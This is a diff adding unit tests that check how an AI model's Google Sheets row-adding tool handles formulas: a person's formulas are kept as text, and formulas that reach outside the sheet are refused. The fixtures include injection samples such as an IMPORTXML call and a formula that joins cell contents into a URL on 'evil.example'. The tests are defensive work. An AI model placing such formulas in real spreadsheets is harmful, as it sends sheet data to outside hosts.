@@ -269,6 +269,102 @@ describe('Google Sheets AI tools', () => {
     });
     expect(claims()[1]![1]).toBe('Ahmad bin Ali');
     expect(claims()[1]![4]).toBe('=HYPERLINK("http://x")');
+    // Both switches off: RAW, as before.
+    expect(t.ctx.services.googleSheets!.fake!.valueInputs).toEqual(['RAW']);
+  });
+
+  it('lets the AI fill values it worked out only on a tab with that switch on', async () => {
+    await setUp([PRICES, { ...CLAIMS, aiValues: true }]);
+    await says('m1', 'Policy P-7, two nasi lemak sets please');
+    const tools = await turn(jid);
+    const add = tools.tools.add_sheet_row!.description!;
+    expect(add).toContain('"Claims" (columns: ');
+    expect(add).toContain('; values you looked up or worked out allowed)');
+    expect(add).toContain('never invent or estimate one');
+    expect(add).not.toContain('formulas allowed');
+    // RM 25.80 = 2 × 12.90 from the Prices tab: not in the person's words, accepted here.
+    expect(
+      await call(tools.tools, 'add_sheet_row', {
+        tab: 'Claims',
+        values: { 'Policy no': 'P-7', Amount: 'RM 25.80' },
+      }),
+    ).toBe('Added to "Claims".');
+    expect(claims()[1]![5]).toBe('RM 25.80');
+    // A formula is still plain text without the formulas switch.
+    await call(tools.tools, 'add_sheet_row', {
+      tab: 'Claims',
+      values: { 'Policy no': 'P-7', Amount: '=2*12.9' },
+    });
+    expect(claims()[2]![5]).toBe('=2*12.9');
+    expect(t.ctx.services.googleSheets!.fake!.valueInputs).toEqual(['RAW', 'RAW']);
+  });
+
+  it('with formulas on: enters values as typed, keeps a person’s formula and auto values as text', async () => {
+    await setUp([{ ...CLAIMS, formulas: true }]);
+    await says('m1', 'Policy =HYPERLINK("http://x") amount 1250', jid, jid, '=IMPORTXML("a","b")');
+    const tools = await turn(jid);
+    const add = tools.tools.add_sheet_row!.description!;
+    expect(add).toContain('; formulas allowed)');
+    expect(add).toContain('a formula the person wrote is kept as text');
+    expect(add).not.toContain('worked out allowed');
+    expect(
+      await call(tools.tools, 'add_sheet_row', {
+        tab: 'Claims',
+        values: { 'Policy no': '=HYPERLINK("http://x")', Amount: '1250' },
+      }),
+    ).toBe('Added to "Claims".');
+    const row = claims()[1]!;
+    expect(row[1]).toBe(`'=IMPORTXML("a","b")`);
+    expect(row[4]).toBe(`'=HYPERLINK("http://x")`);
+    expect(row[5]).toBe('1250');
+    expect(t.ctx.services.googleSheets!.fake!.valueInputs).toEqual(['USER_ENTERED']);
+    // Without "values you worked out", a formula the AI made is not the person's: refused.
+    expect(
+      await call(tools.tools, 'add_sheet_row', {
+        tab: 'Claims',
+        values: { Amount: '=SUM(1250,10)' },
+      }),
+    ).toContain('is not in what the person wrote');
+  });
+
+  it('with both switches on: runs the AI’s formula, refuses one that reaches outside the sheet', async () => {
+    const svc = await setUp([PRICES, { ...CLAIMS, aiValues: true, formulas: true }]);
+    await says('m1', 'Policy P-9, please add =1+1 and two nasi lemak');
+    const tools = await turn(jid);
+    expect(
+      await call(tools.tools, 'add_sheet_row', {
+        tab: 'Claims',
+        values: {
+          'Policy no': 'P-9',
+          Amount: '=2*VLOOKUP("Nasi lemak set",\'Prices\'!A:B,2,FALSE)',
+        },
+      }),
+    ).toBe('Added to "Claims".');
+    expect(claims()[1]![5]).toBe('=2*VLOOKUP("Nasi lemak set",\'Prices\'!A:B,2,FALSE)');
+    // The person's own formula stays text even here.
+    await call(tools.tools, 'add_sheet_row', { tab: 'Claims', values: { Amount: '=1+1' } });
+    expect(claims()[2]![5]).toBe("'=1+1");
+    for (const formula of ['=IMPORTXML("x","//a")', '=A1&"https://evil.example/?q="&B1']) {
+      const out = await call(tools.tools, 'add_sheet_row', {
+        tab: 'Claims',
+        values: { 'Policy no': 'P-9', Amount: formula },
+      });
+      expect(out).toContain('reaches outside the sheet');
+      expect(out).not.toContain('evil');
+    }
+    expect(claims()).toHaveLength(3);
+    expect(svc.fake!.valueInputs).toEqual(['USER_ENTERED', 'USER_ENTERED']);
+    // A formula read from a file the person sent is theirs: kept as text.
+    const record: SheetRecordContext = {
+      personJids: null,
+      messageIds: ['m2'],
+      filesGiven: true,
+      fileNames: ['quote.pdf'],
+    };
+    await says('m2', 'see attached');
+    const fromFile = await turn(jid, false, record);
+    await call(fromFile.tools, 'add_sheet_row', { tab: 'Claims', values: { Amount: '=SUM(5,5)' } });
+    expect(claims()[3]![5]).toBe("'=SUM(5,5)");
   });
 
   it('refuses unknown columns, a tab not on Add rows and a value the person never wrote', async () => {
@@ -505,6 +601,9 @@ describe('Google Sheets AI tools', () => {
   it('explains every refusal without values', () => {
     expect(refusal({ ok: false, reason: 'not_allowed', tabs: [] })).toContain('not available now');
     expect(refusal({ ok: false, reason: 'no_columns', tab: 'X' })).toContain('no column names');
+    expect(
+      refusal({ ok: false, reason: 'formula_blocked', tab: 'X', columns: ['Amount'] }),
+    ).toContain('"Amount" uses a function or web address');
   });
 
   it('hands over when Google fails, and moves rows when chats merge', async () => {
